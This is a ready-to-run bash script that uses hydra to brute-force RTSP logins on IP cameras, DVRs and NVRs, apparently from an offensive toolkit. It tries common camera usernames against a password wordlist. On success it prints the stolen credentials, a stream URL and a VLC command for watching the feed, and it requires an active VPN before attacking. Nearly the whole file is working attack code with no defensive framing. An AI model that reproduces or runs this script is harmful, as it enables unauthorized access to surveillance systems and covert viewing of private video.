#!/bin/bash

# RTSP (Real Time Streaming Protocol) Attack Script
# Description: Attacks RTSP streams (IP cameras, surveillance systems)
# Usage: Edit TARGET variable and run

set -euo pipefail

# ============================================
# CONFIGURATION - EDIT ONLY THIS LINE
# ============================================
TARGET="192.168.1.100"  # <-- Change this to your RTSP device IP (IP camera, DVR, NVR)

# ============================================
# DO NOT EDIT BELOW THIS LINE
# ============================================

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Configuration
PROJECT_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
WORDLIST="${PROJECT_ROOT}/config/admin_passwords.txt"
PORT=554  # RTSP default port
THREADS=8
LOG_FILE="${HOME}/hydra-logs/rtsp_$(date +%Y%m%d_%H%M%S).log"

# Common IP camera usernames
CAMERA_USERS="admin root user Admin guest operator service"

# Banner
echo -e "${BLUE}"
echo "╔════════════════════════════════════════╗"
echo "║   RTSP Stream Attack (IP Cameras)     ║"
echo "║   Target: $TARGET:$PORT"
echo "╚════════════════════════════════════════╝"
echo -e "${NC}"

# Check VPN
if [ -f "${PROJECT_ROOT}/scripts/vpn_check.sh" ]; then
    bash "${PROJECT_ROOT}/scripts/vpn_check.sh" || {
        echo -e "${YELLOW}[!] VPN not active${NC}"
        exit 1
    }
fi

# Check hydra
if ! command -v hydra &> /dev/null; then
    echo -e "${RED}[!] Hydra not found. Run: bash install.sh${NC}"
    exit 1
fi

# Check wordlist
if [ ! -f "$WORDLIST" ]; then
    echo -e "${RED}[!] Wordlist not found: $WORDLIST${NC}"
    exit 1
fi

# Create temporary users file
TEMP_USERS=$(mktemp)
trap 'rm -f "$TEMP_USERS"' EXIT ERR

echo "$CAMERA_USERS" | tr ' ' '\n' > "$TEMP_USERS"

# Create log directory
mkdir -p "$(dirname "$LOG_FILE")"

echo -e "${BLUE}[*] Starting RTSP attack...${NC}"
echo -e "${BLUE}[*] Target: $TARGET:$PORT${NC}"
echo -e "${BLUE}[*] Testing users: $CAMERA_USERS${NC}"
echo -e "${BLUE}[*] Threads: $THREADS${NC}"
echo -e "${YELLOW}[!] Target: IP cameras, DVRs, NVRs${NC}"

# Run hydra attack
hydra -L "$TEMP_USERS" -P "$WORDLIST" \
    -t "$THREADS" \
    -s "$PORT" \
    -f \
    -o "$LOG_FILE" \
    "$TARGET" \
    rtsp 2>&1 | while IFS= read -r line; do
    
    echo "$line"
    
    if echo "$line" | grep -q "login:"; then
        username=$(echo "$line" | sed -n 's/.*login: \([^ ]*\).*/\1/p')
        password=$(echo "$line" | sed -n 's/.*password: \(.*\)/\1/p')
        
        echo -e "${GREEN}[+] SUCCESS! RTSP credentials found:${NC}"
        echo -e "${GREEN}    Username: $username${NC}"
        echo -e "${GREEN}    Password: $password${NC}"
        echo -e "${GREEN}[+] Stream URL: rtsp://$username:$password@$TARGET:$PORT/stream${NC}"
        echo -e "${GREEN}[+] View with: vlc rtsp://$username:$password@$TARGET:$PORT/stream${NC}"
        
        if [ -f "${PROJECT_ROOT}/scripts/logger.sh" ]; then
            source "${PROJECT_ROOT}/scripts/logger.sh"
            save_result "rtsp" "$TARGET" "$PORT" "$username" "$password"
        fi
    fi
done

echo -e "${GREEN}[+] Attack completed!${NC}"
echo -e "${BLUE}[*] Results saved to: $LOG_FILE${NC}"
echo -e "${YELLOW}[!] Common RTSP paths to try:${NC}"
echo -e "${YELLOW}    /stream, /live, /video, /h264, /mpeg4${NC}"
